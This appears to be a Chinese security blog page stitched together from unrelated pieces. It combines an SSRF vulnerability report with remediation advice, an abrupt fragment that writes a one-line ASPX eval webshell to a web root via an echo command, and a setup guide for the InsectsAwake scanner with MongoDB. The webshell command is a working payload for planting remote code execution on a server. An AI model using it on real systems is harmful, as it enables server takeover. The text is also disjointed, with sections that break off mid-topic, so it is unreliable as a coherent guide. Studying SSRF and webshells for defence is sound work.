SSRF漏洞的检测及防御

1.SSRF简介

(1)漏洞名称：

SSRF(Server-Side Request Forgery:服务器端请求伪造)

(2)漏洞描述：

SSRF 是一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。
SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页 文本内容、加载指定地址的图片、下载等。

  • 1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。
  • 2.攻击运行在内网或本地的应用程序(比如溢出)。
  • 3.对内网web应用进行指纹识别，通过访问默认文件实现。
  • 4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击(比 如struts2，sqli等)。
  • 5.利用file协议读取本地文件等。

(3)风险等级：

高危

2.漏洞位置

请求数据包

3.漏洞测试

服务请求外部资源未过滤，导致SSRF漏洞。
可批量扫描内网，获取内网信息。
开放的端口

未开放的端口

4.结论

此漏洞可刺探内网情报，获取网络布局。配合进一步的攻击手段，可以得到更多的信息，数据，和权限。造成更大的危害。

5.整改建议

  • 1.过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。
  • 2.统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。
  • 3.限制请求的端口为http常用的端口，比如，80、443、8080、8090。
  • 4.黑名单内网ip。避免应用被用来获取获取内网数据，攻击内网。
  • 5.禁用不需要的协议。仅仅允许http和https请求。

windows 使用dir /s/a-d/b d:*iframe.aspx 查询文件绝对路径

windows、Linux均用echo写入文件

echo ^<^%@ Page Language=”Jscript” validateRequest=”false” %^>^<^%Response.Write(eval(Request.Item[“w”],”unsafe”));%^>^ > “d:\wwwroot\webshell.aspx”

3.2.Linux

Linux下需要对$用\进行转义，如下:

惊蛰扫描系统搭建

参考大佬的搭建教程
https://mp.weixin.qq.com/s/mm-T2iqcnCnN0W5layix8Q

1.环境

本机：kali 4.15
项目地址：https://github.com/jeffzh3ng/InsectsAwake

2.MongoDB安装

首先在kali安装MongoDB

下载地址
https://www.mongodb.com/download-center#community

install命令
wget https://fastdl.mongodb.org/linux/mongodb-linux-x86_64-debian71-3.6.4.tgz
tar -zxvf mongodb-linux-x86_64-debian71-3.6.4.tgz
mv mongodb-linux-x86_64-debian71-3.6.4 /usr/local/mongodb

然后进入/usr/local/mongodb目录创建data, data目录下创建db
目录结构： /usr/local/mongodb/data/db

添加环境变量
export PATH=/usr/local/mongodb/bin:$PATH

3.运行

1、进入安装目录/usr/local/mongodb 运行./bin/mongod
2、在InsectsAwake根目录运行 ./runsh start (我这里运行restart会出错)
